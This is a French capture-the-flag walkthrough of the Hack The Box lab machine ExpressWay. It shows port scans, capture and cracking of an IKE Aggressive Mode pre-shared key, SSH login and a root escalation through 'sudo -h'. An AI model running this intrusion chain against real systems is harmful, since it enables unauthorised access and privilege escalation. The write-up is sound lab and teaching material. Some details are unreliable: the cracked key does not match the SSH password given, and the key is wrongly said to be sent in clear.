# HTB — ExpressWay · Linux · Easy

**IP :** `10.10.11.87` &nbsp;|&nbsp; **Outils :** nmap · udpx · ike-scan · psk-crack · ssh

---

## Contexte

> Machine atypique : la surface d'attaque principale n'est pas HTTP mais **UDP/500 (IKE)**. Le scan TCP classique ne révèle qu'un port SSH — tout se passe côté protocole IPsec.

---

## Reconnaissance

### Scan TCP

```bash
nmap -sC -sV -O 10.10.11.87
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

Un seul port TCP ouvert. Pas de web, pas d'API. Il faut regarder ailleurs.

### Scan UDP

```bash
nmap -Pn -sU -sV -T3 --top-ports 25 10.10.11.87
```

```
69/udp   open          tftp   Netkit tftpd or atftpd
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

Le port **500/UDP (ISAKMP/IKE)** est ouvert. Ce protocole gère l'échange de clés pour les tunnels IPsec — inhabituel sur une machine CTF, et donc très intéressant.

Confirmation avec udpx :

```bash
./udpx -t 10.10.11.87
# 10.10.11.87:500 (ike)
```

---

## Exploitation

### Récupération du handshake IKE

```bash
ike-scan -M -v 10.10.11.87
```

```
10.10.11.87  Main Mode Handshake returned
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)
VID=09002689dfd6b712 (XAUTH)
```

Le serveur répond en **PSK (Pre-Shared Key)**. En mode Aggressive, la clé est échangée en clair et peut être capturée :

```bash
ike-scan -A --pskcrack 10.10.11.87
```

```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
IKE PSK parameters (g_xr:g_xi:cky_r:...):
d075f9b3786680...
```

Le hash PSK est récupéré avec l'identité `ike@expressway.htb`.

### Crack du PSK

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt psk.hash
```

```
key "freakingrockstarontheroad" matches SHA1 hash 6145867...
8045040 iterations in 5.034 seconds
```

Mot de passe trouvé en 5 secondes avec rockyou.

### Connexion SSH

```bash
ssh ike@10.10.11.87
# Password: lloveyou

cat ~/user.txt
# user_flag{**********************}
```

---

## Escalade de privilèges

### Énumération

```bash
id
# uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Le groupe **proxy** donne accès aux logs Squid.

```bash
cat /var/log/squid/access.log.1 | grep offramp
# TCP_DENIED/403 GET http://offramp.expressway.htb
```

L'URL `offramp.expressway.htb` apparaît dans les logs — c'est un indice. `sudo` accepte un paramètre `-h` (host) pour exécuter des commandes via un hôte distant :

```bash
/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
```

```
root@expressway:/# cat /root/root.txt
root_flag{**********************}
```

---

## Flags

```
user.txt  →  user_flag{**********************}
root.txt  →  root_flag{**********************}
```

---

## Ce que j'ai retenu

**Scanner UDP est indispensable.** Un scan TCP seul ne montre qu'un port SSH — la machine semblerait presque vide. Tout l'intérêt était sur le port 500/UDP.

**IKE Aggressive Mode = PSK exposé.** En mode Aggressive, le handshake contient le hash de la Pre-Shared Key. Si le mot de passe est faible, `psk-crack` + rockyou le retrouve en quelques secondes.

**`sudo -h` est une technique de privesc peu connue.** L'option `-h` permet d'indiquer un hôte pour l'exécution — exploitable quand un hôte interne fait confiance à la machine cible.

---

## Ressources

- [UDPx — GitHub](https://github.com/nullt3r/udpx)
- [ike-scan — documentation](https://github.com/royhills/ike-scan)
- [HackTricks — IKE / IPsec](https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting)
